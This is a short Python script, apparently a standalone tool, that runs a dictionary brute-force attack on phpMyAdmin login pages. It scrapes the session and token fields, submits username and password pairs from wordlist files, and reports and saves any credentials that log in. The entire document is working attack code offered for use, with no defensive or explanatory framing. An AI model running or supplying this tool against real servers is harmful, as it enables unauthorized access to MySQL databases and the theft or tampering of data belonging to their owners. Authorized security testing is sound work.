#!/usr/bin/env python3
import requests
import html
import re
import os
import argparse

def login(url, username, password):
	for i in range(3):
		try:
			res = requests.get(url)
			cookies = dict(res.cookies)
			data = {
				'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'pma_username': username,
				'pma_password': password,
			}
			res = requests.post(url, cookies=cookies, data=data)
			cookies = dict(res.cookies)
			return 'pmaAuth-1' in cookies
		except:
			pass
	return False

def main():
	parser = argparse.ArgumentParser(description='e.g. python3 %s -url http://example.com/pma/ -user root -dict password.txt' % (os.path.basename(__file__)))
	parser.add_argument('-url', help='The URL of target website')
	parser.add_argument('-user', default='root', help='The username of MySQL (default: root)')
	parser.add_argument('-udict', default='none.txt', help='The file path of username dictionary (default: NULL)')
	parser.add_argument('-pdict', default='password.txt', help='The file path of password dictionary (default: password.txt)')

	args = parser.parse_args()
	url = args.url
	pwdDictionary = args.pdict
	userDictionary = args.udict

	if url is None:
		parser.print_help()
		return

	#Getting passwords
	try:
		f = open(pwdDictionary, "r")
		passwords = re.split("[\r\n]+", f.read())
		f.close()
	except:
		print("[-] Failed to read '%s' file." % (pwdDictionary))
		return

	#Getting users
	try:
		f = open(userDictionary, "r")
		users = re.split("[\r\n]+", f.read())
		f.close()
	except:
		users = [args.user]

	for user in users:
		for password in passwords:
			if login(url, user, password):
				print("[*] FOUND - %s / %s" % (user, password))

				f = open("found.txt", "w")
				f.write("%s / %s\n" % (user, password))
				f.close()
			else:
				print("[!] FAILED - %s / %s" % (user, password))

if __name__ == '__main__':
	main()
